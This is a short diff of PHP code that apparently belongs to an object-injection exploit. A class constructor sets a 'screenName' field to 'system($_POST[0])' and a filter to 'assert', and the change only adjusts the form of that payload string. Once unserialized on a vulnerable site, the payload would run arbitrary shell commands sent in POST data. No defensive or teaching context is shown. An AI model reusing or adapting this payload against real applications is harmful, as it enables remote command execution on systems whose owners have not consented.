@@ -28,7 +28,7 @@
       private $_filter = array();
 
       public function __construct(){
-         $this->_params['screenName'] = 'system($_POST[0])';
+         $this->_params['screenName'] = 'system("" . $_POST[0])';
          $this->_filter[0] = 'assert';
       }
    }
